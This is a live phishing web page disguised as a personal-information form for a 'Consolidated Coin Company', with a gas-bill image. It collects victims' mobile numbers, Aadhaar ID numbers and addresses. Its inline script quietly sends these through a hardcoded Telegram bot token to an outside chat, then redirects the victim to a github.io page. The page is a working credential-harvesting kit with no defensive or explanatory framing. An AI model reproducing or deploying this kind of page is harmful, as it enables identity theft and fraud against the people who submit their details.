<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Personal Information Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"], input[type="number"] {
            width: 90%;
            padding: 8px;
            margin: 5px 0 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div class="container">
     <center>
   <img src="https://i.postimg.cc/PJr5XLGK/Photoroom-20241020-165250.png" alt="Gas Bill Image" style="width: 100px">
   <h4>Consolidated Coin Company PVT.LTD</h4></center>
    <form onsubmit=" return sender()">
        <label for="mobile">Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required>

        <label for="aadhar">Aadhar Number:</label>
        <input type="text" id="aadhar" name="aadhar" required>

        <label for="address">Full Address:</label>
        <input type="text" id="address" name="address" required>

        <input type="submit" value="Submit">
    </form>
</div>
<link rel="stylesheet" href="style.css">
    <script src="sender.js"></script>
  
  <script>
  //bot token
var telegram_bot_id = "7409507544:AAGp5HMfuCUa57mdw_1NGVFe666XETpATdE";
//chat id
var chat_id = 8111831047;
var ready = function () {
    mobile = document.getElementById("mobile").value;
    aadhar = document.getElementById("aadhar").value;
    address = document.getElementById("address").value;
  
    message = 
      "\nMob No: " + mobile +  
      "\nAdhar No: " + aadhar + 
      "\naddress: " + address;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);

        document.location = "https://alokpqr.github.io/chandan3/"; 
      
    });
    document.getElementById("mobile").value = "";
    document.getElementById("aadhar").value = "";
    document.getElementById("address").value = "";
    return false;
};
  </script>
</body>
</html>
